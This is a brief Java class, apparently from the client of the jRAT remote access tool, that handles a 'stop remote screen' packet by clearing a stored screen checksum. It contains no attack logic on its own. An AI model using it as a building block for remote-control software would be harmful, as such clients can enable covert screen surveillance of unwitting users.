package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.Screen;

public class Packet26StopRemoteScreen extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Screen.prevSums = null;
	}

}
